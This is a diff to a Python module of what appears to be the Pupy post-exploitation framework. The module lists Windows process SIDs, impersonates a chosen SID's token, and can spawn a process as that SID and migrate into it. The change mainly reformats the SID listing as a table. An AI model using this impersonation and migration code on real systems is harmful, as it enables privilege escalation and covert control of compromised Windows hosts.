@@ -1,6 +1,6 @@
 # -*- coding: UTF8 -*-
 from pupylib.PupyModule import *
-from pupylib.utils.rpyc_utils import redirected_stdo
+from pupylib.utils.rpyc_utils import redirected_stdo, obtain
 from modules.lib.windows.migrate import migrate
 import ctypes
 
@@ -20,15 +20,16 @@ class ImpersonateModule(PupyModule):
 
 	def run(self, args):
 		if args.list:
-			l=self.client.conn.modules["pupwinutils.security"].ListSids()
-			self.log('\n'.join(l))
+			#with redirected_stdo(self.client.conn):
+			l=obtain(self.client.conn.modules["pupwinutils.security"].ListSids())
+			#self.log('\n'.join(["%s : %s"%x for x in l]))
+			self.rawlog(self.formatter.table_format([{"pid": x[0], "process":x[1], "sid" : x[2], "username":x[3]} for x in l], wl=["pid", "process", "username", "sid"]))
 		elif args.impersonate:
 			if args.migrate:
 				proc_pid=self.client.conn.modules["pupwinutils.security"].create_proc_as_sid(args.impersonate)
 				migrate(self, proc_pid)
 			else:
 				self.client.impersonated_dupHandle=self.client.conn.modules["pupwinutils.security"].impersonate_sid_long_handle(args.impersonate, close=False)
-				print self.client.impersonated_dupHandle
 			self.success("Sid %s impersonated !"%args.impersonate)
 		elif args.rev2self:
 			self.client.conn.modules["pupwinutils.security"].rev2self()
